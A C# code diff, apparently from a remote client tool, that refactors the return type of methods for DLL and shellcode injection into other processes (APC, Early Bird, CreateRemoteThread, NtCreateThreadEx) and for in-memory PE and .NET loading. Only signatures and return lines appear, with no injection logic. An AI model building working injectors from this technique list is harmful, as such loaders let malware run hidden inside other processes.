@@ -47,7 +47,7 @@ namespace winClient48
         /// <param name="nProcID">Process ID.</param>
         /// <param name="abDllBytes">DLL file bytes.</param>
         /// <returns></returns>
-        public (int nCode, string szMsg) fnApcDLL(int nProcID, byte[] abDllBytes)
+        public clsRetValue fnApcDLL(int nProcID, byte[] abDllBytes)
         {
             int nCode = 0;
             string szMsg = string.Empty;
@@ -106,7 +106,7 @@ namespace winClient48
                 szMsg = ex.Message;
             }
 
-            return (nCode, szMsg);
+            return new clsRetValue { nCode = nCode, szMsg = szMsg };
         }
 
         /// <summary>
@@ -115,7 +115,7 @@ namespace winClient48
         /// <param name="nProcID">Process ID.</param>
         /// <param name="abDllBytes">DLL file bytes.</param>
         /// <returns></returns>
-        public (int nCode, string szMsg) fnEarlyBirdDll(int nProcID, byte[] abDllBytes)
+        public clsRetValue fnEarlyBirdDll(int nProcID, byte[] abDllBytes)
         {
             int nCode = 0;
             string szMsg = string.Empty;
@@ -200,7 +200,7 @@ namespace winClient48
                 szMsg = ex.Message;
             }
 
-            return (nCode, szMsg);
+            return new clsRetValue { nCode = nCode, szMsg = szMsg };
         }
 
         /// <summary>
@@ -209,7 +209,7 @@ namespace winClient48
         /// <param name="nProc">Process ID.</param>
         /// <param name="abDllBytes">DLL file bytes.</param>
         /// <returns></returns>
-        public (int nCode, string szMsg) fnRemoteCreateThreadDLL(int nProc, byte[] abDllBytes)
+        public clsRetValue fnRemoteCreateThreadDLL(int nProc, byte[] abDllBytes)
         {
             int nCode = 0;
             string szMsg = string.Empty;
@@ -252,7 +252,7 @@ namespace winClient48
                 szMsg = ex.Message;
             }
 
-            return (nCode, szMsg);
+            return new clsRetValue { nCode = nCode, szMsg = szMsg };
         }
 
         /// <summary>
@@ -261,7 +261,7 @@ namespace winClient48
         /// <param name="nProcId">Process ID.</param>
         /// <param name="abDllBytes">DLL file bytes.</param>
         /// <returns></returns>
-        public (int nCode, string szMsg) fnNtCreateThreadExDll(int nProcId, byte[] abDllBytes)
+        public clsRetValue fnNtCreateThreadExDll(int nProcId, byte[] abDllBytes)
         {
             int nCode = 0;
             string szMsg = string.Empty;
@@ -297,7 +297,7 @@ namespace winClient48
                 szMsg = ex.Message;
             }
 
-            return (nCode, szMsg);
+            return new clsRetValue { nCode = nCode, szMsg = szMsg };
         }
 
         /// <summary>
@@ -306,7 +306,7 @@ namespace winClient48
         /// <param name="nProcId">Process ID.</param>
         /// <param name="abDllBytes">DLL file bytes.</param>
         /// <returns></returns>
-        public (int nCode, string szMsg) fnZwCreateThreadExDll(int nProcId, byte[] abDllBytes)
+        public clsRetValue fnZwCreateThreadExDll(int nProcId, byte[] abDllBytes)
         {
             int nCode = 0;
             string szMsg = string.Empty;
@@ -363,7 +363,7 @@ namespace winClient48
                 szMsg = ex.Message;
             }
 
-            return (nCode, szMsg);
+            return new clsRetValue { nCode = nCode, szMsg = szMsg };
         }
 
         #endregion
@@ -376,7 +376,7 @@ namespace winClient48
         /// <param name="nProcId">Process ID.</param>
         /// <param name="abShellCode">Shellcode bytes.</param>
         /// <returns></returns>
-        public (int nCode, string szMsg) fnApcSC(int nProcId, byte[] abShellCode)
+        public clsRetValue fnApcSC(int nProcId, byte[] abShellCode)
         {
             int nCode = 0;
             string szMsg = string.Empty;
@@ -432,7 +432,7 @@ namespace winClient48
                 szMsg = ex.Message;
             }
 
-            return (nCode, szMsg);
+            return new clsRetValue { nCode = nCode, szMsg = szMsg };
         }
 
         /// <summary>
@@ -441,7 +441,7 @@ namespace winClient48
         /// <param name="nProcId">Process ID.</param>
         /// <param name="abShellCode">Shellcode bytes.</param>
         /// <returns></returns>
-        public (int nCode, string szMsg) fnEarlyBirdSC(int nProcId, byte[] abShellCode)
+        public clsRetValue fnEarlyBirdSC(int nProcId, byte[] abShellCode)
         {
             int nCode = 0;
             string szMsg = string.Empty;
@@ -509,7 +509,7 @@ namespace winClient48
                 szMsg = ex.Message;
             }
 
-            return (nCode, szMsg);
+            return new clsRetValue { nCode = nCode, szMsg = szMsg };
         }
 
         /// <summary>
@@ -518,7 +518,7 @@ namespace winClient48
         /// <param name="nProcId">Process ID.</param>
         /// <param name="abShellCode">Shellcode bytes.</param>
         /// <returns></returns>
-        public (int nCode, string szMsg) fnCreateRemoteThreadSC(int nProcId, byte[] abShellCode)
+        public clsRetValue fnCreateRemoteThreadSC(int nProcId, byte[] abShellCode)
         {
             int nCode = 0;
             string szMsg = string.Empty;
@@ -554,7 +554,7 @@ namespace winClient48
                 szMsg = ex.Message;
             }
 
-            return (nCode, szMsg);
+            return new clsRetValue { nCode = nCode, szMsg = szMsg };
         }
 
         /// <summary>
@@ -563,7 +563,7 @@ namespace winClient48
         /// <param name="nProcId">Process ID.</param>
         /// <param name="abShellCode">Shellcode bytes.</param>
         /// <returns></returns>
-        public (int nCode, string szMsg) fnNtCreateThreadExSC(int nProcId, byte[] abShellCode)
+        public clsRetValue fnNtCreateThreadExSC(int nProcId, byte[] abShellCode)
         {
             int nCode = 0;
             string szMsg = string.Empty;
@@ -604,7 +604,7 @@ namespace winClient48
                 szMsg = ex.Message;
             }
 
-            return (nCode, szMsg);
+            return new clsRetValue { nCode = nCode, szMsg = szMsg };
         }
 
         /// <summary>
@@ -613,7 +613,7 @@ namespace winClient48
         /// <param name="nProcId">Process ID.</param>
         /// <param name="abShellCode">Shellcode bytes.</param>
         /// <returns></returns>
-        public (int nCode, string szMsg) fnZwCreateThreadExSC(int nProcId, byte[] abShellCode)
+        public clsRetValue fnZwCreateThreadExSC(int nProcId, byte[] abShellCode)
         {
             int nCode = 0;
             string szMsg = string.Empty;
@@ -651,7 +651,7 @@ namespace winClient48
                 szMsg = ex.Message;
             }
 
-            return (nCode, szMsg);
+            return new clsRetValue { nCode = nCode, szMsg = szMsg };
         }
 
         #endregion
@@ -663,7 +663,7 @@ namespace winClient48
         /// </summary>
         /// <param name="abDllBytes"></param>
         /// <returns></returns>
-        public (int nCode, string szMsg) fnLdrLoadDll(byte[] abDllBytes)
+        public clsRetValue fnLdrLoadDll(byte[] abDllBytes)
         {
             int nCode = 0;
             string szMsg = string.Empty;
@@ -690,7 +690,7 @@ namespace winClient48
                 szMsg = ex.Message;
             }
 
-            return (nCode, szMsg);
+            return new clsRetValue { nCode = nCode, szMsg = szMsg };
         }
 
         /// <summary>
@@ -698,7 +698,7 @@ namespace winClient48
         /// </summary>
         /// <param name="abShellCode"></param>
         /// <returns></returns>
-        public (int nCode, string szMsg) fnShellCodeLoader(byte[] abShellCode)
+        public clsRetValue fnShellCodeLoader(byte[] abShellCode)
         {
             int nCode = 0;
             string szMsg = string.Empty;
@@ -734,7 +734,7 @@ namespace winClient48
                 szMsg = ex.Message;
             }
 
-            return (nCode, szMsg);
+            return new clsRetValue { nCode = nCode, szMsg = szMsg };
         }
 
         /// <summary>
@@ -742,7 +742,7 @@ namespace winClient48
         /// </summary>
         /// <param name="abFileBytes">x64 PE file bytes.</param>
         /// <returns></returns>
-        public (int nCode, string szMsg) fnX86PELoader(byte[] abFileBytes)
+        public clsRetValue fnX86PELoader(byte[] abFileBytes)
         {
             int nCode = 0;
             string szMsg = string.Empty;
@@ -881,7 +881,7 @@ namespace winClient48
                 szMsg = ex.Message;
             }
 
-            return (nCode, szMsg);
+            return new clsRetValue { nCode = nCode, szMsg = szMsg };
         }
 
         /// <summary>
@@ -889,7 +889,7 @@ namespace winClient48
         /// </summary>
         /// <param name="abFileBytes">x64 PE file bytes.</param>
         /// <returns></returns>
-        public (int nCode, string szMsg) fnX64PELoader(byte[] abFileBytes)
+        public clsRetValue fnX64PELoader(byte[] abFileBytes)
         {
             int nCode = 0;
             string szMsg = string.Empty;
@@ -1046,10 +1046,10 @@ namespace winClient48
                 szMsg = ex.Message;
             }
 
-            return (nCode, szMsg);
+            return new clsRetValue { nCode = nCode, szMsg = szMsg };
         }
 
-        public (int nCode, string szMsg) fnLoadDotNetDll(byte[] abDllByte, string szTypeName, string szMethodName)
+        public clsRetValue fnLoadDotNetDll(byte[] abDllByte, string szTypeName, string szMethodName)
         {
             int nCode = 0;
             string szMsg = string.Empty;
@@ -1070,10 +1070,10 @@ namespace winClient48
                 szMsg = ex.Message;
             }
 
-            return (nCode, szMsg);
+            return new clsRetValue { nCode = nCode, szMsg = szMsg };
         }
 
-        public (int nCode, string szMsg) fnLoadDotNetExe(byte[] abBuffer, string[] args)
+        public clsRetValue fnLoadDotNetExe(byte[] abBuffer, string[] args)
         {
             int nCode = 0;
             string szMsg = string.Empty;
@@ -1094,7 +1094,7 @@ namespace winClient48
                 szMsg = ex.Message;
             }
 
-            return (nCode, szMsg);
+            return new clsRetValue { nCode = nCode, szMsg = szMsg };
         }
 
         #endregion
